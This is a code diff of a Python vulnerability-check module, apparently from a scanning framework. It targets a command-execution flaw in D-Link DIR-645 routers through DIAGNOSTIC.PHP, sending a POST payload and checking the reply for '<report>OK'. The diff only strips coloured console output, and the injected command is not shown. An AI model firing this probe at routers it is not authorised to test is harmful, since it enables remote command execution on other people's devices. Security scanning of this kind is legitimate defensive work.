@@ -14,8 +14,7 @@ This module has been tested successfully on DIR-645 prior to 1.03, where authent
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
+
 
 class router_dlink_command_exec_BaseVerify():
     def __init__(self, url):
@@ -34,18 +33,14 @@ class router_dlink_command_exec_BaseVerify():
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"<report>OK" in req.text:
-                cprint("[+]存在Dlink DIAGNOSTIC.PHP命令执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
                 return True, vulnurl, "Dlink DIAGNOSTIC.PHP命令执行", str(payload), req.text
             else:
-                cprint("[-]不存在router_dlink_command_exec漏洞", "white", "on_grey")
                 return False, None, None, None, None
 
         except:
-            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
             return False, None, None, None, None
 
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = router_dlink_command_exec_BaseVerify(sys.argv[1])
     testVuln.run()
